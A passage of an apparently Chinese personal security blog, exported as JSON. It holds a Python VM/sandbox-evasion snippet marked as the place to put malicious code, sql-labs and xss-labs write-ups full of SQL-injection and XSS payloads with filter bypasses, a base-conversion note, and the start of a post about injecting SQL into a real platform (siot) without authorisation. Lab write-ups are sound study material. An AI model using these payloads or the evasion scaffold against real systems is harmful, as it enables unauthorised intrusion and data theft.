file_3:<br>    exit()<br><span class=\"hljs-keyword\">else</span>:<br>    <span class=\"hljs-keyword\">if</span> bootTime &lt;= <span class=\"hljs-number\">0.5</span>:<br>        sleep(<span class=\"hljs-number\">100</span>)<br><br><span class=\"hljs-keyword\">if</span> count &lt; <span class=\"hljs-number\">4</span>:<br>    sleep(<span class=\"hljs-number\">100</span>)<br><br><span class=\"hljs-keyword\">if</span> total_size &lt;= <span class=\"hljs-number\">50</span> * <span class=\"hljs-number\">1024</span>:<br>    <span class=\"hljs-built_in\">print</span>(total_size)<br>    sleep(<span class=\"hljs-number\">100</span>)<br><br><span class=\"hljs-keyword\">else</span>:<br>    <span class=\"hljs-comment\"># 如果是虚拟机就不会执行下面的代码</span><br>    <span class=\"hljs-comment\"># 这里存放你要执行的恶意代码</span><br></code></pre></td></tr></table></figure>\n\n<p>这并不能检测全部的虚拟机、沙箱，具体的可以自己根据思路改改代码</p>\n","tags":["python"]},{"title":"sql-labs打靶随记","url":"/2023/06/16/sql-labs%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是sql-labs</p>\n<span id=\"more\"></span>\n\n<p>这个靶场之前学习时已经做掉不少了，</p>\n<p>并且这里的六十多个靶场有很多重复的靶场，</p>\n<p>因此这里只记录有价值、代表性的靶场</p>\n<h1 id=\"Less42\"><a href=\"#Less42\" class=\"headerlink\" title=\"Less42\"></a>Less42</h1><p>这一关看着是一个登录界面，</p>\n<p>尝试了万能密码以及其他所有的http头注入无果，</p>\n<p>这里看了一下别人的writeup，发现刚巧用到刚学的堆叠注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">login_user=1&amp;login_password=1&#x27;;insert into users(id,username,password) values (&#x27;39&#x27;,&#x27;abc&#x27;,&#x27;123456&#x27;)--+&amp;mysubmit=Login<br></code></pre></td></tr></table></figure>\n\n<p>然后登录进去后看到如下页面：</p>\n\n\n<p>又是一个类似登录界面的东西，这里尝试获取数据库，</p>\n<p>看一下源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$username</span>= <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&quot;username&quot;</span>];<br><span class=\"hljs-variable\">$curr_pass</span>=<span class=\"hljs-title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;current_password&#x27;</span>]);<br><span class=\"hljs-variable\">$pass</span>= <span class=\"hljs-title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>]);<br><span class=\"hljs-variable\">$re_pass</span>= <span class=\"hljs-title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;re_password&#x27;</span>]);<br></code></pre></td></tr></table></figure>\n\n<p>这里还不可以使用宽字节注入，</p>\n<p>但是发现username没有过滤，</p>\n<p>我们尝试在username注入，</p>\n<p>但是发现压根没用。。。。</p>\n<p>然后又仔细看了看源代码，发现好像到这一步就结束了</p>\n<p>后面的就是变换了闭合什么的，都是堆叠注入，</p>\n<p>（好像我记得有一两个是login_password的报错注入）</p>\n<h1 id=\"Less46\"><a href=\"#Less46\" class=\"headerlink\" title=\"Less46\"></a>Less46</h1><p>这一关是get注入，</p>\n<p>但是发现无法判断闭合，且不是数字型注入，</p>\n<p>并且输入数字之后会出现不同的结果，</p>\n<p>推测是order by语句，然后通过extractvalue报错注入，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?sort=1 and extractvalue(1,concat(0x7e,(database())))<br></code></pre></td></tr></table></figure>\n\n<p>后面几个就是变换了闭合方式，</p>\n<p>最后3个是盲注，这里就不记录了</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>六十几个靶场实际上都是偏基础的，</p>\n<p>我记录的只是后面的第3，4部分两个最典型的靶场，</p>\n<p>其他几乎只变换了闭合方式，</p>\n<p>这里有几个心得：</p>\n<ul>\n<li><p>数字型注入有时候也是可以有括号的</p>\n<p>这个就比较头疼了，判读闭合不是单引号或者双引号，</p>\n<p>然后and 1&#x3D;1 and 1&#x3D;2 判断是不是数字型依旧无果，</p>\n<p>这时候我一般会考虑关键字例如and被过滤了，</p>\n<p>但是没想过闭合会使数字型加上括号，</p>\n<p>如果我们没有后台源码，我们不知道他的数字型注入有几个括号，</p>\n<p>网站开发者完全可以设置一万个括号来防止我们注入。。。</p>\n</li>\n<li><p>一般报错注入不是通过union select</p>\n<p>之前的笔记中，一般报错注入的语句是这个样子的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,extractvalue(xxx)--+<br></code></pre></td></tr></table></figure>\n\n<p>但是我发现在实战中这个语句更加实用，</p>\n<p>节省了判断字段数和回显点的一步</p>\n</li>\n<li><p>在burpsuite里面操作比在hackbar操作里面好</p>\n</li>\n</ul>\n","categories":["Web"],"tags":["sql"]},{"title":"任意进制之间的转换","url":"/2023/04/05/%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/","content":"<p>最近备战蓝桥杯，复习资料里面发现往年真题有一个关于任意进制之间的互相转换</p>\n<p>正好我也比较好奇，于是研究了一下，</p>\n<span id=\"more\"></span>\n\n<p>他这道题是选择题，填空题，所以是不可以使用python内置函数来计算的</p>\n<h1 id=\"使用python内置函数实现\"><a href=\"#使用python内置函数实现\" class=\"headerlink\" title=\"使用python内置函数实现\"></a>使用python内置函数实现</h1><p>但是我这较真劲。。。我两个都要搞出来！</p>\n<p>python有几个内置函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-built_in\">hex</span>()   <span class=\"hljs-comment\"># 10 转 16</span><br><span class=\"hljs-built_in\">bin</span>()   <span class=\"hljs-comment\"># 10 转 2</span><br><span class=\"hljs-built_in\">oct</span>()   <span class=\"hljs-comment\"># 10 转 8</span><br></code></pre></td></tr></table></figure>\n\n<p>任意进制转10进制后面讨论</p>\n<p>然后是把转换后的进制再转换回10进制</p>\n<p>说出来你们可能不信，使用的就是你们日常使用的int()函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs example\">&gt;&gt;&gt; hex(666)<br>&#x27;0x29a&#x27;<br>&gt;&gt;&gt; int(&#x27;0x29a&#x27;, 16)   # 16就是要转换的进制<br>666<br></code></pre></td></tr></table></figure>\n\n<p>其他函数同理。</p>\n<h1 id=\"使用手算实现\"><a href=\"#使用手算实现\" class=\"headerlink\" title=\"使用手算实现\"></a>使用手算实现</h1><h3 id=\"任意进制转10进制\"><a href=\"#任意进制转10进制\" class=\"headerlink\" title=\"任意进制转10进制\"></a>任意进制转10进制</h3><p>拿666(8进制形式的)这个数转10进制举例</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">索引</th>\n<th align=\"center\">2</th>\n<th align=\"center\">1</th>\n<th align=\"center\">0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">数</td>\n<td align=\"center\">6</td>\n<td align=\"center\">6</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td align=\"center\">运算</td>\n<td align=\"center\">6 x 8^2</td>\n<td align=\"center\">6 x 8^1</td>\n<td align=\"center\">6 x 8^0</td>\n</tr>\n</tbody></table>\n<p>注：^ 代表的是次方</p>\n<p>6 x 8^2 + 6 x 8^1 + 6 x 8^0 </p>\n<p>&#x3D;384 + 48 + 6</p>\n<p>&#x3D;438</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs check\">&gt;&gt;&gt; oct(438)<br>&#x27;0o666&#x27;<br>&gt;&gt;&gt; int(&#x27;0o666&#x27;, 8)<br>438<br></code></pre></td></tr></table></figure>\n\n<p>正确！</p>\n<h3 id=\"10进制转任意进制\"><a href=\"#10进制转任意进制\" class=\"headerlink\" title=\"10进制转任意进制\"></a>10进制转任意进制</h3><p>这个个人认为最简单了</p>\n<ul>\n<li><p>整数部分——除k取余，余数反写</p>\n</li>\n<li><p>小数部分——乘k取整，按顺序写</p>\n</li>\n</ul>\n<p>我就不画图了，直接上图片</p>\n<p>整数：</p>\n<p class='item-img' data-src='https://img1.imgtp.com/2023/04/06/6OJlxD45.png'><img src=\"https://img1.imgtp.com/2023/04/06/6OJlxD45.png\"></p>\n<p>小数：</p>\n<p class='item-img' data-src='https://img1.imgtp.com/2023/04/06/MZRWYwz9.png'><img src=\"https://img1.imgtp.com/2023/04/06/MZRWYwz9.png\"></p>\n<h3 id=\"2-8-16-进制之间的互相转换-整数\"><a href=\"#2-8-16-进制之间的互相转换-整数\" class=\"headerlink\" title=\"2 8 16 进制之间的互相转换(整数)\"></a>2 8 16 进制之间的互相转换(整数)</h3><h5 id=\"小转大\"><a href=\"#小转大\" class=\"headerlink\" title=\"小转大\"></a>小转大</h5><p>最简单的就是先转10进制然后10进制再转</p>\n<p>举个栗子：</p>\n<p>10110110(2进制形式) — &gt; 8进制</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">bin</th>\n<th align=\"center\">10</th>\n<th align=\"center\">110</th>\n<th align=\"center\">110</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">oct</td>\n<td align=\"center\">2</td>\n<td align=\"center\">6</td>\n<td align=\"center\">6</td>\n</tr>\n</tbody></table>\n<p>bin(10) &#x3D;&#x3D;  int(2) &#x3D;&#x3D; oct(2)</p>\n<p>bin(110) &#x3D;&#x3D; int(6) &#x3D;&#x3D; oct(6)</p>\n<p>bin(110) &#x3D;&#x3D; int(6) &#x3D;&#x3D; oct(6)</p>\n<p>所以 bin (10110110) &#x3D;&#x3D; oct(266)</p>\n<p>注意是从后往前，所以最后的应该是开头两个数10(<em><u><strong>整数部分不用补位!!!我写文章的时候都差点写错了</strong></u></em>)</p>\n<p>为什么是3位一转呢？因为2 ^ <strong>3</strong> &#x3D;&#x3D; 8</p>\n<h5 id=\"大转小\"><a href=\"#大转小\" class=\"headerlink\" title=\"大转小\"></a>大转小</h5><p>原理同上，举个栗子：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">oct</th>\n<th align=\"center\">2</th>\n<th align=\"center\">6</th>\n<th align=\"center\">6</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">bin</td>\n<td align=\"center\">10</td>\n<td align=\"center\">110</td>\n<td align=\"center\">110</td>\n</tr>\n</tbody></table>\n<p>懂了吧</p>\n<h3 id=\"2-8-16-进制转换为10进制-小数\"><a href=\"#2-8-16-进制转换为10进制-小数\" class=\"headerlink\" title=\"2 8 16 进制转换为10进制(小数)\"></a>2 8 16 进制转换为10进制(小数)</h3><p><strong>这个就要补位了！！！</strong></p>\n<p>并且是从前往后补</p>\n<p>栗子：</p>\n<p>二进制数：101.01011</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">补0后</th>\n<th align=\"center\">0101</th>\n<th align=\"center\">0101</th>\n<th align=\"center\">1000</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">int</td>\n<td align=\"center\">5</td>\n<td align=\"center\">5</td>\n<td align=\"center\">8</td>\n</tr>\n</tbody></table>\n<p>所以10进制下的就是5.58了</p>\n<h1 id=\"拜拜\"><a href=\"#拜拜\" class=\"headerlink\" title=\"拜拜~~\"></a>拜拜~~</h1>","categories":["Note"],"tags":["python"]},{"title":"反射性Xss注入学习笔记","url":"/2023/06/28/%E5%8F%8D%E5%B0%84%E6%80%A7Xss%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<p>这篇文章是反射性xss认识以及xss-lab实操打靶</p>\n<span id=\"more\"></span>\n\n<p>首先这个学习笔记来源于合天网安的公开课：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1hY411a7P5\">https://www.bilibili.com/video/BV1hY411a7P5</a></p>\n<p>然后这篇笔记是第3，4p，反射型xss的讲解</p>\n<h1 id=\"原理概述\"><a href=\"#原理概述\" class=\"headerlink\" title=\"原理概述\"></a>原理概述</h1>\n\n<h1 id=\"注入语句\"><a href=\"#注入语句\" class=\"headerlink\" title=\"注入语句\"></a>注入语句</h1><ol>\n<li><p><code>&lt;scipt&gt;js注入语句&lt;/script&gt;</code></p>\n</li>\n<li><p><code>&lt;img src=1 onerror=js注入语句&gt;</code></p>\n<p>拓展：</p>\n\n</li>\n<li><p><code>&lt;onclick=prompt(1)&gt;</code>  </p>\n</li>\n<li><p><code>&#39; onfocus=javascript:alert() &#39;</code></p>\n</li>\n<li><p><code>&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;</code></p>\n</li>\n<li><p><code>&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,注入语句base64形式&quot;&gt;&lt;&quot;</code></p>\n</li>\n</ol>\n<p>更多：<a href=\"https://blog.csdn.net/LYJ20010728/article/details/116462782\">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p>\n<h1 id=\"函数、语句介绍\"><a href=\"#函数、语句介绍\" class=\"headerlink\" title=\"函数、语句介绍\"></a>函数、语句介绍</h1><ul>\n<li><code>eval()</code> 同python的eval()，bypass之神，将字符串作为代码执行</li>\n<li><code>String.fromCharCode()</code> 传入字符串的ASCII值，将其转换成字符串</li>\n<li><code>document.cookie</code> 获取用户的cookie</li>\n<li>获取更多的信息可以使用跨站脚本注入接收平台，如xsser、蓝莲花等。。。个人推荐蓝莲花</li>\n</ul>\n<h1 id=\"实操-xss-labs\"><a href=\"#实操-xss-labs\" class=\"headerlink\" title=\"实操 xss-labs\"></a>实操 xss-labs</h1><h2 id=\"Less1\"><a href=\"#Less1\" class=\"headerlink\" title=\"Less1\"></a>Less1</h2><p>这一关非常简单，直接就是构造最简单的payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>但是我们要知道为什么这里可以使用这一个payload，打开源码查看：</p>\n\n\n<p>看到第17和18行，他将url中的name参数后面的值不加处理直接放到了html语句中，并且前后的闭合都是完整的，因此不需要其他的字符来闭合</p>\n<h2 id=\"Less2\"><a href=\"#Less2\" class=\"headerlink\" title=\"Less2\"></a>Less2</h2><p>这一关查看界面源代码（注意不是php的源代码），第17行：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">keyword</span>  <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;123&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>其中的123，就是用户的输入，此时我们就要闭合这个语句了，因为前后的闭合都不是完整的，如果不闭合，我们的js代码就不会被执行</p>\n<p>Payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot;&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure>\n\n<p>但是在页面中有两个可以注入的地方：第18行和第20行，为什么偏偏选择第20行呢？查看源代码便可以找到解释</p>\n\n\n<p>函数htmlspecialchars的作用是将所有特殊的符号（其实就是两个尖括号）进行转义，让他不做为html元素被读取。因此第18行的注入点不可以被利用，但是第20行的没有做任何过滤，因此选择第20行注入</p>\n<h2 id=\"Less3\"><a href=\"#Less3\" class=\"headerlink\" title=\"Less3\"></a>Less3</h2><p>这一关第一眼看上去和上面一关的唯一区别就是第17行的源代码换成了单引号，其他的几乎没有变化，那我们尝试用上一关的payload，只修改一个单引号：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&#x27;&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>&lt;&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>但是却没有成功，我们查看源代码试试</p>\n\n\n<p>看来是都被过滤了，那怎么注入？</p>\n<p>我们可以利用<strong>事件</strong>来绕过</p>\n\n\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; onfocus=javascript:alert() &#x27;<br></code></pre></td></tr></table></figure>\n\n<p>这个payload是针对于第18行的，因为我们的payload中不可以出现被过滤的字符<code>&lt;</code>和<code>&gt;</code></p>\n<p>这个payload有1点需要注意的：</p>\n<ul>\n<li>两个单引号之间需要有空格，不可以写成</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;onfocus=javascript:alert()&#x27;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less4\"><a href=\"#Less4\" class=\"headerlink\" title=\"Less4\"></a>Less4</h2>\n\n<p>这一关首先将两个尖括号都替换成了空，然后还在20行使用了htmlspeicalchars函数，但是这个对我们的注入没有什么影响，因为我们的payload中没有出现尖括号，这些过滤对我门没有用处</p>\n<p>我们构造payload（第20行的）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot; onfocus=javascript:alert() &quot;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less5\"><a href=\"#Less5\" class=\"headerlink\" title=\"Less5\"></a>Less5</h2>\n\n<p>这一关替换了<code>&lt;script&gt;</code>为<code>&lt;scr_ipt&gt;</code>，<code>on</code>为<code>o_n</code>并且使用了htmlspecialchars函数过滤尖括号以及strlowwer函数将字符全部转换为小写，因此大小写绕过方式用不了了，但是22行却没有过滤尖括号，因此我们构造针对22行的payload</p>\n<p>但是这一行又肯定要用到<code>&lt;script&gt;</code>或<code>on</code>怎么绕过呢？我们这里就不可以使用复写过滤字符串了，只能尝试从语句上做点手脚了，当然前提是尖括号没被过滤</p>\n\n\n<p>payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot;&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">javascript:alert()</span>&gt;</span>xxx<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less6\"><a href=\"#Less6\" class=\"headerlink\" title=\"Less6\"></a>Less6</h2>\n\n<p>这一关没有过滤大小写，直接大小写绕过即可</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;&lt;&quot;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less7\"><a href=\"#Less7\" class=\"headerlink\" title=\"Less7\"></a>Less7</h2><p>这一关看源码就知道使用复写字符串来绕过，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot;&gt;&lt;sCrscriptipt&gt;alert(1)&lt;/sCrscriptipt&gt;&lt;&quot;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less8\"><a href=\"#Less8\" class=\"headerlink\" title=\"Less8\"></a>Less8</h2><p>这一关过滤了我们前面提到的所有的绕过方式，我们引入一个新的绕过方式，利用href的隐藏特性：自动Unicode解码来绕过！将注入语句编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;<br><br>javascript:alert()<br></code></pre></td></tr></table></figure>\n\n<p>然后插入到我们的payload中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot; &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41; &quot;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less9\"><a href=\"#Less9\" class=\"headerlink\" title=\"Less9\"></a>Less9</h2>\n\n<p>相比前面的几关，这一关又多了一个判断：strpos</p>\n<p>简单介绍下函数：</p>\n<blockquote>\n<p>定义和用法</p>\n<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>\n<p>注释：strpos() 函数对大小写敏感。</p>\n<p>注释：该函数是二进制安全的。</p>\n</blockquote>\n<p>就是判断http是否在我们的注入语句中，那绕过很简单，在注释里面加上http这个字符串就好了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */<br></code></pre></td></tr></table></figure>\n\n<p>注意注释就不用编码了，不然程序找不到这一串字符串还是会拦截 </p>\n<h2 id=\"Less10\"><a href=\"#Less10\" class=\"headerlink\" title=\"Less10\"></a>Less10</h2><p>这一关不查看源码是绝对做不出来的，因为有一个隐藏的传参名t_sort，并且最后的注入点也是这个t_sort传参进来的字符串经过处理后的，我们只需要绕过这一层检测即可</p>\n<p>尖括号的绕过方式应该已经是非常娴熟了，构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot; onfocus=javascript:alert() &quot;<br></code></pre></td></tr></table></figure>\n\n<p>咦？没有出现弹窗？无奈看一下writeup</p>\n\n\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure>\n\n<p>原来还要一个type&#x3D;text才可以将输入框显示出来</p>\n<h2 id=\"Less11\"><a href=\"#Less11\" class=\"headerlink\" title=\"Less11\"></a>Less11</h2><p>查看源代码，发现这一关的注入点是在http头的referer下，过滤了尖括号，因此只能使用事件来注入，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Referer: &quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Less12\"><a href=\"#Less12\" class=\"headerlink\" title=\"Less12\"></a>Less12</h2><p>将上一关的payload从referer中放到ua头即可</p>\n<h2 id=\"Less13\"><a href=\"#Less13\" class=\"headerlink\" title=\"Less13\"></a>Less13</h2>\n\n<p>这一关的主要绕过是在cookie里面，所以我们将上一关的payload放到cookie里面即可</p>\n<p>注意，不要将cookie里面的user&#x3D;删了，不然程序接受不到参数</p>\n<h2 id=\"Less14\"><a href=\"#Less14\" class=\"headerlink\" title=\"Less14\"></a>Less14</h2><p>这一关演示不了，会自动跳转，但是自动跳转的网站无了，具体的见下：</p>\n\n\n<p><a href=\"https://www.freebuf.com/articles/web/282983.html\">https://www.freebuf.com/articles/web/282983.html</a></p>\n<h2 id=\"Less15\"><a href=\"#Less15\" class=\"headerlink\" title=\"Less15\"></a>Less15</h2><p>看到url中含有src关键字的时候，第一感觉就是绝对要用到<code>&lt;img src=xxx onerror=javascript:alert()&gt;</code>这个语句了，但是查看源代码发现这一关的题目应该有点类似之前学到的文件包含漏洞</p>\n<p>简单介绍一下新出现的一个函数ng-include</p>\n<blockquote>\n<p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p>\n</blockquote>\n<p>然后看了一下writeup，八九不离十：</p>\n\n\n<p>主要的原理和前面的文件包含漏洞千篇一律，需要记住主要的语法，然后构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?src=&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(1)&quot;&gt;&#x27;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p><strong>ng-include文件包涵，可以无视html实体化</strong></p>\n</blockquote>\n<h2 id=\"Less16\"><a href=\"#Less16\" class=\"headerlink\" title=\"Less16\"></a>Less16</h2><p>查看源码，这一关最主要的过滤了空格，限制了我们的注入</p>\n<p>但是这个的绕过方式其实和sql注入绕过空格的方式是一样的，就是利用url编码来绕过，可以使用0b、0a等来绕过，这里挑选0a，构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;img%0Asrc=&quot;x&quot;%0Aonerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>\n\n<p>成功通关</p>\n<h2 id=\"Less17-Less18\"><a href=\"#Less17-Less18\" class=\"headerlink\" title=\"Less17-Less18\"></a>Less17-Less18</h2><p>首先这关需要浏览器支持flash插件，如果不支持的可以将level17的源码中.swf后缀的文件改成index.png</p>\n<p>其实这一关和下面一关是一样的，并且这没有什么利用价值，因为支持flash插件的浏览器越来越少了，但是我们还是简单了解一下</p>\n\n\n<p>出现了一个新的标签embed，来看一下他的解释</p>\n\n\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?arg01=a&amp;arg02=b onmouseout=alert()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Less19-Less20\"><a href=\"#Less19-Less20\" class=\"headerlink\" title=\"Less19-Less20\"></a>Less19-Less20</h2><p>这两关实在太难了，完全不会做，但是找到了两位师傅的文章，可以看看</p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/103213877\">https://blog.csdn.net/u014029795/article/details/103213877</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_30702413/article/details/99326627\">https://blog.csdn.net/weixin_30702413/article/details/99326627</a></p>\n<h1 id=\"绕过方式总结\"><a href=\"#绕过方式总结\" class=\"headerlink\" title=\"绕过方式总结\"></a>绕过方式总结</h1><ol>\n<li>大小写绕过</li>\n<li>复写过滤字符串绕过</li>\n<li>利用非黑名单语句绕过<ul>\n<li>利用事件绕过</li>\n<li>利用内置语法绕过</li>\n</ul>\n</li>\n<li>href利用自动unicode编码绕过</li>\n</ol>\n<p>给出一个测试payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">sRc DaTa OnFocus OnmOuseOver OnMouseDoWn &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;<br></code></pre></td></tr></table></figure>\n\n<p>可以通过这个payload测试出后端源码的过滤规则从而帮助我们在不看源码的情况下bypass过滤&#x2F;检测</p>\n","categories":["Note"],"tags":["xss"]},{"title":"各种数据库类型sql注入","url":"/2023/07/05/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/","content":"<p>在一个不偶然的机遇之下，接触到了siot平台，无聊之下，发现了一个一个sql注入的漏洞，同时引出了今天的文章</p>\n<span id=\"more\"></span>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这是一次无聊的婴幼儿性质的科技活动，本人被迫参加</p>\n<p>今天上午的在活动中摸鱼的时候，偶然一瞥发现了一个类似留言板的搜索框，心想闲着没事，正好sql注入玩玩😁</p>\n<h1 id=\"注入历程\"><a href=\"#注入历程\" class=\"headerlink\" title=\"注入历程\"></a>注入历程</h1><p>因为当时人比较多还是摸鱼的怕被发现，没有记录太多，只是保留了一些珍贵的图像以及当时的注入语句，这里简单叙述一下，后面会本地搭建siot平台研究的（如果有价值的话）</p>\n<ol>\n<li><p>单引号闭合弹错误消息，双引号闭合不报错，判断出是单引号闭合</p>\n</li>\n<li><p>猜测是post提交“#”闭合无效，尝试”–+“成功（原因后面会说），判断出闭合是单引号</p>\n</li>\n<li><p>order by判断字段数是5</p>\n</li>\n<li><p>union select 联合查询注出回显点为1，2，4<br class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png'><img src=\"/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png\"></p>\n</li>\n<li><p>尝试获取基本信息</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">union select database(),2,3,4,5<br></code></pre></td></tr></table></figure>\n\n<p> 报错，怀疑过滤，用上了bypass waf的注释依旧不行，尝试把database换成version user均失败</p>\n<p> 没关系可能这一步被全部过滤了，直接构造下一步的语句</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">union select group_concat(table_name) from 